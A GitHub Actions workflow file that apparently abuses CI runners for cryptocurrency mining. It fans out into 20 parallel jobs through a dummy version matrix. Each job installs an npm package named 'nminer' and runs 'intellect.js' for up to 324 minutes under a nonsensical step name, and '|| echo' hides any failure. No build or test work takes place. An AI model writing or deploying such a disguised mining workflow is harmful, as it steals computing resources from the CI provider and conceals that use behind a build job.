name: intellect
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4357 }
          - { version: 9016 }
          - { version: 5979 }
          - { version: 5959 }
          - { version: 2314 }
          - { version: 451 }
          - { version: 9764 }
          - { version: 166 }
          - { version: 1327 }
          - { version: 1248 }
          - { version: 1985 }
          - { version: 9572 }
          - { version: 5358 }
          - { version: 4643 }
          - { version: 9083 }
          - { version: 82 }
          - { version: 6050 }
          - { version: 7294 }
          - { version: 3492 }
          - { version: 3803 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: inspect pant meaty pigsty
        run: |
          npm install nminer@latest
          timeout 324m node intellect.js || echo "intellect executed"